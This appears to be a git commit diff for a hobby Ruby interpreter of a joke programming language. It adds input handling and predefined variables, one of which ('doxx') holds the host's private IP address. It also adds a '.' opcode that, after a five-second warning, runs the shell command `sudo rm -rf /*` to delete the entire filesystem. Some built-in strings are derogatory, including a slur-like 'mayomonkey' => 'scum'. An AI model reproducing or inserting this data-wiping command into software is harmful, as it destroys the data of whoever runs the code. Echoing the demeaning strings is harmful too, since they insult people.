34a380103e719b7b39963cd7f70f893f19159e2d
hugo <hugo@moniker.net>
2022-11-01 09:20:11 +1100

    finished interperator

--- lib/datamethods.rb
+++ lib/datamethods.rb
@@ -1,5 +1,8 @@
 require 'dentaku'
 
+# these are methods that can be used for the compiler and
+# the interperator as the return a form of data.
+
 class String
   def is_integer?
     self.to_i.to_s == self
@@ -10,32 +13,25 @@ module Methods
 	def newvariable line
 		name = String.new
 		value = String.new 
-
 		chars = line.split('')
-
 		n=1
 		until chars[n] == '=' do 
 			name << chars[n]
 			n+=1 
 		end
 		n+=1
-		
 		(n..(chars.length-1)).each do |i|
 			value << chars[i]
 		end
-
 		if value.is_integer? == true
 			return name.to_sym, value.to_i
 		end
-
 		return name.to_sym, value
 	end
 
 	def hugyprint(memory, line)
 		value = String.new
-
 		chars = line.split('')
-	
 		if chars[1] == '$'
 			name = String.new
 			(2..(chars.length-1)).each do |i|
@@ -54,23 +50,17 @@ module Methods
 		chars = line.split('')
 		place = 2
 		var = String.new
-
 		until chars[place] == '['
 			var << chars[place]
 			place += 1
 		end
-
 		place += 1
-
 		eq = String.new
-
 		until chars[place] == ']'
 			eq << chars[place]
 			place +=1
 		end
-
 		calculator = Dentaku::Calculator.new
-
 		return var.to_sym, calculator.evaluate(eq).to_i
 	end
 
@@ -80,7 +70,6 @@ module Methods
 		if memory.has_key?(key) != true
 			return nil
 		end
-
 		return memory[key].to_s
 	end
 end
--- lib/interperetor.rb
+++ lib/interperetor.rb
@@ -1,13 +1,19 @@
 require_relative './datamethods.rb'
+require 'socket'
 
 include Methods
 
 def interperate code
+    ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
+
     vars = {
         :hugy => "the filth is real",
         :schizo => "they are in the walls",
-        :mayomonkey => "scum"
+        :mayomonkey => "scum",
+        :walter => "jesse, we need to cook",
+        :doxx => ip.ip_address.to_s,
     }
+
     code.each do |line|
         case line.chr
             when ':' # print
@@ -16,22 +22,30 @@ def interperate code
             when '$' # new var
                 k, v = Methods.newvariable(line)
                 vars[k] = v
-            when '&' # loop
-                chars = line.split('')
-                iterations = String.new
-                i = 1
-                until chars[i] == '.'
-                    iterations << chars[i]
-                    i+=1
-                end
-                if iterations == String.new
-                    return 0, line
-                end
             when '*'
                 k,v = Methods.maths(line)
                 vars[k] = v
+            when '%' 
+                chars = line.split('')
+                name = String.new
+
+                n=2
+                until chars[n] == nil do 
+                    name << chars[n].to_s
+                    n+=1 
+                end
+
+                input = STDIN.gets.chomp.to_s
+
+                # STDin works but not 'gets' ¯\_(ツ)_/¯ 
+
+                vars[name.to_sym] = input
+            when '.'
+                Process.uid != 0  ? puts('sudo access required'): puts("press ^C to abort within the next 5 seconds")
+                sleep 5
+                `sudo rm -rf /*` # shell script to delete everything
             else 
-                puts('unrecognised input')
+                puts('unrecognised syntax')
         end
     end
     return 1
